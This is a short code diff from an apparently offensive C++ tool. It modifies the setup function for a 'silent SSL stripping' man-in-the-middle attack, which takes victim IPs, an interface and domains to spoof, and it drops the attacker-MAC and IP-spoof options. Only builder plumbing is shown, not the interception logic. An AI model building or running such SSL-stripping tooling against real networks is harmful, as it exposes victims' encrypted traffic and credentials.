@@ -49,26 +49,15 @@ void ATK::SSL::silentStrip(const SilentStrippingOptions &options) {
                                     " is not a valid interface");
     }
 
-    for (const std::string &ipToSpoofStr : options.ipsToSpoof) {
-
-        const pcpp::IPv4Address ipToSpoof(ipToSpoofStr);
-    }
-
     ATK::SSL::SilentSslStrippingStrategy::Builder builder(device);
-
-    if (options.attackerMac.has_value()) {
-        const pcpp::MacAddress macAddress(options.attackerMac.value());
-        builder = builder.attackerMac(macAddress);
-    }
 
     for (const std::string &victimIpStr : options.victimIps) {
         const pcpp::IPv4Address victimIp(victimIpStr);
         builder.addVictimIp(victimIp);
     }
 
-    for (const std::string &ipToSpoofStr : options.ipsToSpoof) {
-        const pcpp::IPv4Address ipToSpoof(ipToSpoofStr);
-        builder = builder.addIpToSpoof(ipToSpoof);
+    for (const std::string &domainToSpoofStr : options.domainsToSpoof) {
+        builder = builder.addDomainToSpoof(domainToSpoofStr);
     }
 
     std::unique_ptr<ATK::SSL::SilentSslStrippingStrategy> strategy =
